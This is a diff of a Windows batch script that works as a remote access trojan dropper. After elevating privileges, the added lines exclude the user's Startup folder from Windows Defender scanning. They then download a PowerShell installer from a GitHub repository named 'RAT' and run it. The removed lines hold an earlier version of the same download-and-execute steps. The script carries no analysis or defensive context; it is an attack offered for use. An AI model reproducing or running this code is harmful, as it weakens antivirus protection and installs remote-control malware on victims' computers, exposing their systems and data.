@@ -29,19 +29,10 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------    
-    <YOUR BATCH SCRIPT HERE>
 
+REM Disable Windows Defender
+powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
-REM disable defender
-
-REM rat ressources
-
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1";
-
-powershell "./installer.ps1"
-
-@REM Add-MpPreference -ExclusionPath "C:\Users\user\%username%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; "./installer.ps1"
-
-
-
-
+REM Download and run PowerShell script
+powershell -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
+powershell -File .\installer.ps1
